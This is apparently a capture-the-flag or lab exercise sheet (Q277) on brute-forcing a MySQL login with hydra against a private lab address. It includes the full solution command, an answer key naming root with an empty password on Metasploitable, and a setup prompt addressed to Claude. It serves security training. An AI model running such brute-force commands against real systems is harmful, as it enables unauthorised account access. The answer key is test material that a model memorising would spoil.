# Q277 — Brute Force MySQL Using Hydra

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Brute force MySQL login on target port 3306."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>
```

---

## ✅ Solution

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.52.129 mysql -t 4
```

**Answer:** `user=root; password=` (empty password on Metasploitable)

---

## 🤖 Claude Setup Prompt

Ensure MySQL on port 3306 accessible remotely. Report back: "Lab ready for Q277"
